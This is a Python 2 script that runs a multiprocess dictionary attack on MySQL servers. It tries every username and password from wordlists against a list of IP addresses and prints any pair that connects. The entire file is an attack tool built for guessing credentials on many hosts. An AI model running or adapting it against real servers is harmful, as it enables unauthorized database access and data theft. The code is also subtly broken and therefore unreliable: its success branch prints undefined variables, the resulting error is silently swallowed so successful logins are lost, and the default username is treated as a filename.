#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
from optparse import OptionParser 
import sys
import MySQLdb
import multiprocessing
      
def mysqlpass(lock,user,passwd,host,port):
    try:
        MySQLdb.connect(host=host,user=user,passwd=passwd,port=port,db="test")
        print host,username,password
    except Exception, e:
        pass

def main():
    lock = multiprocessing.Manager().Lock()
    p = multiprocessing.Pool(processes=50)
    parser = OptionParser()
    parser.add_option("-u", "--username",default='root',dest="userdic",help=u"mysql帐号字典")
    parser.add_option("-p", "--password",dest="passwdic",help=u"mysql密码字典")
    parser.add_option("-P", "--port",default=3306,dest="port",type="int",help=u"mysql端口号,默认3306")
    parser.add_option("-H", "--host",dest="iplist",help=u"mysql ip列表")
    if len(sys.argv) == 1:
        parser.print_help()
    else:
        (options, args) = parser.parse_args()
        with open(options.userdic) as user:
            for i in user:
                with open(options.passwdic) as passwords:
                    for j in passwords:
                        with open(options.iplist) as ip:
                            for k in ip:
                                p.apply_async(mysqlpass,args = (lock,i.strip(),j.strip(),k.strip(),options.port))
    p.close()
    p.join()
if __name__ == '__main__':
    main()